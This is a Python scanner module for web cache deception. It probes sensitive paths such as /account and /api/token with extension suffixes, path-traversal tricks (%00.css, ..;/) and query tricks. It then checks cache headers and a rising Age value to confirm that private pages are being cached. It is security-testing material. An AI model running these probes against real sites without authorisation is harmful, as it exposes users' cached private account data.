"""cache_deception v2 — Web Cache Deception with Age verify + path traversal.

Классы атак:
  1. Extension confusion — /account/foo.css заставляет CDN кэшировать HTML
  2. Path traversal — /account%00.css, /account;.css, /account/..;/
  3. Query suffix — /account?x=.css
  4. Missing cache-busters — Cache-Control: public без private

Verify: Age растёт при повторном запросе → реально кэшируется.
"""
import re
import time
from core.http import HttpClient
from core.verify import confidence, is_signal


# 20+ суффиксов для extension confusion
SUFFIXES = [
    ".css", ".js", ".jpg", ".jpeg", ".png", ".gif", ".ico",
    ".svg", ".woff", ".woff2", ".ttf", ".eot", ".txt", ".json", ".xml",
    ".webp", ".avif", ".map", ".htm", ".html",
]

# path traversal уловки
TRAVERSALS = [
    ";.css",
    "%00.css",
    "%2500.css",
    "%0a.css",
    "%2f.css",
    "..;/foo.css",
    "/..%2f.css",
    "/%20.css",
]

# query-уловки
QUERY_TRICKS = [
    "?x=.css",
    "?/foo.css",
    "?foo=bar.css",
    "?#.css",
]

# чувствительные пути
PRIVATE_PATHS = [
    "/profile", "/account", "/me", "/my",
    "/settings", "/dashboard", "/admin",
    "/api/me", "/api/user", "/api/admin", "/api/token",
    "/api/v1/user", "/api/v1/me", "/api/v2/user",
    "/user/profile", "/user/account", "/user/settings",
    "/account/profile", "/account/settings", "/account/me",
]

# cache headers для fingerprint CDN
CACHE_HEADERS = [
    "cf-cache-status", "x-cache", "x-cache-status", "x-cache-hits",
    "age", "x-served-by", "x-varnish", "x-fastcgi-cache",
    "x-proxy-cache", "x-cacheable", "x-cdn", "x-cache-remote",
    "x-amz-cf-id", "x-akamai-transformed", "x-sucuri-cache",
]


def _cache_info(resp):
    """Собирает cache-related headers из ответа."""
    if not resp:
        return {}
    hdrs = {k.lower(): v for k, v in resp.headers.items()}
    info = {}
    for ch in CACHE_HEADERS:
        if ch in hdrs:
            info[ch] = hdrs[ch]
    # age как число
    if "age" in hdrs:
        try:
            info["age_int"] = int(hdrs["age"])
        except Exception:
            info["age_int"] = 0
    return info


def _is_cache_hit(cache_info):
    """Определяет, что ответ из кэша (hit)."""
    for k, v in cache_info.items():
        if k == "age_int":
            if v > 0:
                return True
            continue
        vs = str(v).lower()
        if "hit" in vs and "miss" not in vs:
            return True
    return False


class CacheDeception:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)

        print(f"[cache_deception v2] target: {base}")
        print(f"[cache_deception v2] testing {len(PRIVATE_PATHS)} paths × {len(SUFFIXES)} extensions")

        # === Phase 1: fingerprint cache infrastructure ===
        try:
            r_base = http.get(base)
        except Exception:
            print("[cache_deception v2] target unreachable")
            return {"findings": []}

        base_cache = _cache_info(r_base)
        has_cache_infra = bool(base_cache)

        print(f"[cache_deception v2] base cache headers: {base_cache or '(none)'}")

        findings = []

        # === Phase 2: для каждого private path + suffix ===
        for path in PRIVATE_PATHS:
            try:
                r0 = http.get(base + path, allow_redirects=False)
            except Exception:
                continue
            if not r0 or r0.status_code not in (200, 401, 403):
                continue

            base_len = len(r0.content)
            base_cache_info = _cache_info(r0)

            print(f"[cache_deception v2] {path} -> {r0.status_code} ({base_len}b)")

            # Проверяем каждый суффикс
            all_tricks = (
                [(suf, "ext") for suf in SUFFIXES] +
                [(t, "traversal") for t in TRAVERSALS] +
                [(t, "query") for t in QUERY_TRICKS]
            )

            for suf, kind in all_tricks:
                test_url = base + path + suf
                try:
                    r = http.get(test_url, allow_redirects=False)
                except Exception:
                    continue
                if not r:
                    continue

                cache_info = _cache_info(r)
                is_hit = _is_cache_hit(cache_info)

                # Сигнал 1: явный cache hit в headers
                if is_hit:
                    # verify: повтор, Age должен вырасти
                    time.sleep(1.0)
                    try:
                        r2 = http.get(test_url, allow_redirects=False)
                    except Exception:
                        r2 = None

                    age_1 = cache_info.get("age_int", 0)
                    age_2 = _cache_info(r2).get("age_int", 0) if r2 else 0

                    verified = age_2 > age_1 or (age_1 > 0 and age_2 >= age_1)

                    conf = confidence(0.9 if verified else 0.7, 1.0 if verified else 0.5)
                    if is_signal(conf, floor=0.55, module="cache_deception"):
                        findings.append({
                            "type": "cache_hit_confirmed",
                            "severity": "critical" if verified else "high",
                            "path": path,
                            "suffix": suf,
                            "kind": kind,
                            "url": test_url,
                            "cache_headers": cache_info,
                            "age_before": age_1,
                            "age_after": age_2,
                            "verified": verified,
                            "confidence": conf,
                        })
                        print(f"  ✓ CACHE HIT ({kind}): {test_url[:80]} age {age_1}→{age_2}")
                        logger.finding("cache_deception", "critical" if verified else "high",
                                       f"{kind} {path}{suf}")
                        break

                # Сигнал 2: сдвиг Cache-Control от private к public
                cc_base = r0.headers.get("Cache-Control", "").lower()
                cc_test = r.headers.get("Cache-Control", "").lower()
                if ("private" in cc_base or "no-store" in cc_base) and \
                   ("public" in cc_test or "max-age" in cc_test) and \
                   "private" not in cc_test:
                    conf = confidence(0.8, 1.0)
                    if is_signal(conf, floor=0.55, module="cache_deception"):
                        findings.append({
                            "type": "cache_control_flip",
                            "severity": "high",
                            "path": path,
                            "suffix": suf,
                            "kind": kind,
                            "url": test_url,
                            "cache_control_base": cc_base[:80],
                            "cache_control_test": cc_test[:80],
                            "confidence": conf,
                        })
                        print(f"  ✓ CACHE-CONTROL FLIP: {path}{suf}")
                        logger.finding("cache_deception_cc", "high",
                                       f"{path}{suf} cc:{cc_base[:30]}->{cc_test[:30]}")
                        break

        print()
        print(f"[cache_deception v2] findings: {len(findings)}")
        return {
            "findings": findings,
            "cache_infra": has_cache_infra,
            "base_cache_headers": base_cache,
        }
